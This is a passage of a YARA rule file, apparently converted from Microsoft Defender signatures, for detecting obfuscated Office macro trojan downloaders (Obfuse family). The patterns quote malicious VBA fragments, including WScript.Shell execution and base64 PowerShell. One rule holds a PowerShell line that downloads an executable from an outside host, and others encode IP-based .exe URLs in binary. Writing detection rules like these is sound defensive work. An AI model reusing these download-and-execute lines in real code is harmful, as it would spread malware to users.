        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6c 6c 45 78 78 63 75 74 65 28 30 2c 20 [0-15] 2c 20 76 65 69 75 72 65 35 32 37 38 65 75 32 2c 20 6d 36 37 74 37 38 37 33 72 37 32 2c 20 22 22 2c 20 53 57 5f 53 48 4f 57 4d 49 4e 49 4d 49 5a 45 44 29}  //weight: 1, accuracy: Low
        $x_1_2 = "call xdecd(hhffwyjihwgef9eiw2, uiytvdverwt67fhrey)\" & vbCrLf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YRV_2147786576_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YRV!MTB"
        threat_id = "2147786576"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "x = Shell(odsuozldxufm(\"50\") & odsuozldxufm(\"4f5745525348454c4c2e6578\")" ascii //weight: 1
        $x_1_2 = "Chr$(Val(\"&H\" & Mid$(gwndcowqyulk, cjzkqjwvtdxr, 2)" ascii //weight: 1
        $x_1_3 = "= 1 To Len(gwndcowqyulk) Step 2" ascii //weight: 1
        $x_1_4 = "Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZRV_2147786583_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZRV!MTB"
        threat_id = "2147786583"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cfwctbzv.Run(zrvxexr, mvfzzxa)" ascii //weight: 1
        $x_1_2 = "plspxijobkld = \"WSCript.shell\"" ascii //weight: 1
        $x_1_3 = "eaga = cds(206) & cds(184) & cds(207) & cds(139) & cds(154) & cds(174) & cds(139) & cds(219) & cds(201) & cds(186) & cds(194) & cds(201) & cds(176)" ascii //weight: 1
        $x_1_4 = "cds = Chr(vd - 107)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAA_2147787407_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAA!MTB"
        threat_id = "2147787407"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subhwopsdxoqbvfd.Run(xsjcgn, jiytqwnvcszwiku)" ascii //weight: 1
        $x_1_2 = "ihkkngiocklf = \"WSCript.shell\"" ascii //weight: 1
        $x_1_3 = "hff(181) & hff(191) & hff(214) & hff(146) & hff(161) & hff(181) & hff(146) & hff(194) & hff(225) & hff(208) & hff(233) & hff(208) & hff(183) & hff(196) & hff(229) & hff(208)" ascii //weight: 1
        $x_1_4 = "hff = Chr(bgfbg - 114)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAB_2147787463_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAB!MTB"
        threat_id = "2147787463"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = "hff = Chr(bgfbg - 114)" ascii //weight: 1
        $x_1_3 = "srow = hff(213) & hff(191) & hff(214) & hff(146) & hff(161) & hff(213) & hff(146) & hff(226) & hff(225) & hff(208) & hff(201) & hff(208) & hff(215) & hff(196) & hff(229) & hff(208)" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 28 [0-30] 2c 20 [0-30] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = "docActive.Range(Start:=docActive.Words(1).Start, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSXC_2147787539_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSXC!MTB"
        threat_id = "2147787539"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "iAHcAQgB5AEEAQwBBAEEASwBBAEEAawBBAEcAawBBAFAAUQBBAHgAQQBEAHMAQQBJAEEAQQBrAEEARwBr" ascii //weight: 1
        $x_1_2 = "IAaQBBAEgAawBBAGEAUQBCAGwAQQBIAEUAQQBiAGcAQQA3AEEAQwBBAEEAZgBRAEIAMABBAEgASQB" ascii //weight: 1
        $x_1_3 = "IAbgBBAEgASQBBAGQAUQBCADYAQQBIAE0AQQBlAGcAQgBwAEEASABVAEEAWQBnAEIAawBBAEgAbwBBAGEAQQBCAG8" ascii //weight: 1
        $x_1_4 = "= nfobjhxuj.Run(" ascii //weight: 1
        $x_1_5 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_6 = "= CreateObject(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAC_2147787573_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAC!MTB"
        threat_id = "2147787573"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = "hff = Chr(bgfbg - 114)" ascii //weight: 1
        $x_1_3 = {68 66 66 28 31 38 31 29 20 26 20 68 66 66 28 ?? ?? ?? 29 20 26 20 68 66 66 28 31 38 32 29 20 26 20 68 66 66 28 31 34 36 29 20 26 20 68 66 66 28 31 36 31 29 20 26 20 68 66 66 28 ?? ?? ?? 29 20 26 20 68 66 66 28 31 34 36 29 20 26 20 68 66 66 28 ?? ?? ?? 29 20 26 20 68 66 66 28 31 39 33 29 20 26 20 68 66 66 28 32 30 38 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 28 [0-39] 2c 20 [0-30] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAD_2147787574_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAD!MTB"
        threat_id = "2147787574"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "objWshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "Environ$(\"USERPROFILE\") & \"\\\" & yftFtfUIFIYTDTRdi5djtfdUSUDTIdutDsdjd" ascii //weight: 1
        $x_1_3 = {49 6e 53 74 72 28 [0-100] 2c 20 4d 69 64 28 [0-100] 2c 20 69 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Range(\"A1\").Value = \"Please wait\"" ascii //weight: 1
        $x_1_5 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-100] 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAF_2147787684_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAF!MTB"
        threat_id = "2147787684"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = "ioyukiu(183) & ioyukiu(193) & ioyukiu(184) & ioyukiu(148) & ioyukiu(163) & ioyukiu(215) & ioyukiu(148) & ioyukiu(228) & ioyukiu(195) & ioyukiu(210) & ioyukiu(235)" ascii //weight: 1
        $x_1_3 = "ioyukiu = Chr(cdssf - 116)" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 28 [0-31] 2c 20 [0-31] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSTB_2147787734_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSTB!MTB"
        threat_id = "2147787734"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Left(pptName, InStr(pptName,\".\")) & \"pdf\"" ascii //weight: 1
        $x_1_2 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_3 = ".Run(derykeqbqjrmopaxmmvpjzike, gdwoasdmjfsz)" ascii //weight: 1
        $x_1_4 = "IAcQBBAEgAawBBAGEAZwBCADMAQQBIAGsAQQBJAEEAQQBvAEEAQwBBAEEASgBBAEIAbgBBAEg" ascii //weight: 1
        $x_1_5 = "IAMgBBAEcAWQBBAGIAZwBCAG8AQQBHAHcAQQBjAEEAQgBzAEEASABBAEEAWgBRAEIAdwBBAEcAOAB" ascii //weight: 1
        $x_1_6 = "IAawBBAEgAYwBBAGEAZwBCAG0AQQBHADAAQQBjAHcAQgBxAEEASABrAEEAYQBnAEIAMwBBAEgAawBBAEkAQQBBAG4AQQB" ascii //weight: 1
        $x_1_7 = "SwBBAEgAUQBBAGIAdwBCAGsAQQBIAGMAQQBhAGcAQgBtAEEARwAwAEEAYwB3AEIAcQBBAEgAawBBAGE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSTC_2147788059_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSTC!MTB"
        threat_id = "2147788059"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 73 65 74 75 70 4d 70 ?? 22 02 00 53 75 62 20 77 69 6e 64 6f 77 5f 6f 70 65 6e 28 [0-20] 29 02 00 53 65 74 20 [0-15] 20 3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 63 20 22 73 63 72 69 70 74 72 75 6e 6e 65 72 2e 65 78 65 20 2d 61 70 70 76 73 63 72 69 70 74 20 22 20 26 20 [0-20] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 61 75 74 6f 6f 70 65 4e 28 29 02 00 6d 69 78 20 22 54 41 22 2c 20 22 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "= \".h\" & " ascii //weight: 1
        $x_1_5 = {50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 [0-5] 22 2c 20 [0-15] 29 02 00 43 6c 6f 73 65 20 23 31 02 00 77 69 6e 64 6f 77 5f 6f 70 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSTD_2147788194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSTD!MTB"
        threat_id = "2147788194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "& \" -w h Start-BitsTransfer -Source htt`p://qdyhygm.com/wp-content/plugins/masterx/New_Requests_1203802IMG.e`xe\" & \" -Destination" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\Documents\\yardlead.e`xe" ascii //weight: 1
        $x_1_3 = "= \"She\"" ascii //weight: 1
        $x_1_4 = "= CreateObject(sheee & \"ll.Application\").Open(thousandpeople" ascii //weight: 1
        $x_1_5 = "= \"C:\\Users\\Public\\Documents\\studytonight.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAG_2147788502_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAG!MTB"
        threat_id = "2147788502"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = "kui(188) & kui(198) & kui(221) & kui(153) & kui(168) & kui(220) & kui(153) & kui(233) & kui(200) & kui(215) & kui(208) & kui(215) &" ascii //weight: 1
        $x_1_3 = "kui(188) & kui(198) & kui(189) & kui(153) & kui(168) & kui(188) & kui(153) & kui(201) & kui(232) & kui(215) & kui(240) & kui(215) &" ascii //weight: 1
        $x_1_4 = "kui = Chr(fscv - 121)" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-31] 2c 20 [0-31] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BWK_2147789158_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BWK!MTB"
        threat_id = "2147789158"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(ActiveDocument.Content, \"dmfd\", \"\")" ascii //weight: 1
        $x_1_2 = "= \".\" & installMixMix & installMp4Before" ascii //weight: 1
        $x_1_3 = ".run \"scriptrunner -appvscript \" & installMixMix, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BZK_2147789159_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BZK!MTB"
        threat_id = "2147789159"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(ActiveDocument.Content, \"ruioq\", \"\")" ascii //weight: 1
        $x_1_2 = ".run \"scriptrunner -appvscript \" & pauseSetBefore, 2" ascii //weight: 1
        $x_1_3 = "= \".\" & pauseSetBefore & beforeBeforeStop" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BXK_2147789160_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BXK!MTB"
        threat_id = "2147789160"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(ActiveDocument.Content, \"8ikot\", \"\")" ascii //weight: 1
        $x_1_2 = ".run \"scriptrunner -appvscript \" & installStopMix, 2" ascii //weight: 1
        $x_1_3 = "= \".\" & installStopMix & startPausePlay" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BYK_2147789161_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BYK!MTB"
        threat_id = "2147789161"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(ActiveDocument.Content, \"gc6f\", \"\")" ascii //weight: 1
        $x_1_2 = ".run \"scriptrunner -appvscript \" & installStopSetup, 2" ascii //weight: 1
        $x_1_3 = "= \".\" & installStopSetup & playPlayWav" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSDT_2147789193_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSDT!MTB"
        threat_id = "2147789193"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= New IWshRuntimeLibrary.WshShell" ascii //weight: 1
        $x_1_2 = ".run mixMp3Install, 2" ascii //weight: 1
        $x_1_3 = {3d 20 22 2e 22 20 26 20 6d 69 78 4d 70 33 49 6e 73 74 61 6c 6c 20 26 20 73 65 74 75 70 53 65 74 4d 70 33 02 00 4f 70 65 6e 20 6d 69 78 4d 70 33 49 6e 73 74 61 6c 6c 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_4 = "Print #1, Replace(ActiveDocument.Content, \"qqnbm\", \"\")" ascii //weight: 1
        $x_1_5 = {50 75 62 6c 69 63 20 53 75 62 20 61 75 74 6f 4f 70 65 6e 28 29 02 00 6d 69 78 4d 69 78 4d 70 33 20 22 22 2c 20 22 48 54 41 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSS_2147789247_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSS!MTB"
        threat_id = "2147789247"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "00110001,00111001,00111000,00101110,00110010,00110011,00101110,00110010,00110101,00110001,00101110,00110001,00110001,00110000,00101111,01100011,01110010,01100101,01100100,01101001,01110100,00101110,01100101,01111000,01100101," ascii //weight: 1
        $x_1_2 = "01110011,01110100,01100001,01110010,01110100,00101101,01110000,01110010,01101111,01100011,01100101,01110011,01110011,00101000,00100100,01100101,01101110,01110110,00111010,01110100,01100101,01101101,01110000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAE_2147789389_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAE!MTB"
        threat_id = "2147789389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {49 6e 53 74 72 28 [0-100] 2c 20 4d 69 64 28 [0-100] 2c 20 69 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Range(\"A1\").Value = \"Please wait\"" ascii //weight: 1
        $x_1_4 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-100] 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAH_2147792912_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAH!MTB"
        threat_id = "2147792912"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = "oiup(189) & oiup(199) & oiup(222) & oiup(154) & oiup(169) & oiup(221) & oiup(154) & oiup(234) & oiup(201) & oiup(216) & oiup(241) & oiup(216)" ascii //weight: 1
        $x_1_3 = "oiup = Chr(fdsg - 122)" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 28 [0-31] 2c 20 [0-45] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRD_2147792983_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRD!MTB"
        threat_id = "2147792983"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ",00111010,00101111,00101111,00110001,00111001,00110010,00101110,00110010,00110010,00110111,00101110,00110001,00110101,00111000,00101110,00110001,00110001,00110001,00101111,01100010,01100001,01101110,01101011,00101110,01100101,01111000,01100101" ascii //weight: 1
        $x_1_2 = "01110011,01110100,01100001,01110010,01110100,00101101,01110000,01110010,01101111,01100011,01100101,01110011,01110011,00101000,00100100,01100101,01101110,01110110,00111010,01110100,01100101,01101101,01110000,00101011,00100000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRDD_2147793066_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRDD!MTB"
        threat_id = "2147793066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_2 = "= Environ(\"temp\") & \"\\srvcrm\" & \".\" & \"ex\" & \"e\"" ascii //weight: 1
        $x_1_3 = "binaryStream.Open" ascii //weight: 1
        $x_1_4 = "binaryStream.SaveToFile" ascii //weight: 1
        $x_1_5 = ".createElement(\"tmp\")" ascii //weight: 1
        $x_1_6 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_7 = "Shell1.ShellExecute fp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRDD_2147793066_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRDD!MTB"
        threat_id = "2147793066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set objShell = CreateObject(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii //weight: 1
        $x_1_2 = "objShell.Run (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)" ascii //weight: 1
        $x_1_3 = "Set objShell = Nothing" ascii //weight: 1
        $x_1_4 = "= Environ(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.EmailSubject)" ascii //weight: 1
        $x_1_5 = "StrComp(\"R982hd023ufdh29k\"," ascii //weight: 1
        $x_1_6 = "= CByte(\"&H\" & Mid(AAAAAAAAAAAAAA, 5, 2))" ascii //weight: 1
        $x_1_7 = "= String(6 - Len(AAAAAAAAAAAAAA), \"0\") & AAAAAAAAAAAAAA" ascii //weight: 1
        $x_1_8 = "subSaveBinaryData AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, bbytes" ascii //weight: 1
        $x_1_9 = "subRun AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRDE_2147793093_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRDE!MTB"
        threat_id = "2147793093"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Get_Data \"5af2eb858f456f2d5a723b14e43c1174\"" ascii //weight: 1
        $x_1_2 = "objWMIService.ExecQuery(\"Select * from Win32_ComputerSystem\", , 48)" ascii //weight: 1
        $x_1_3 = "objWMIService.ExecQuery(\"SELECT * FROM Win32_Processor\", \"WQL\", _" ascii //weight: 1
        $x_1_4 = "(\"winmgmts:\\\\\" & dotSplace & \"\\root\\cimv2\")" ascii //weight: 1
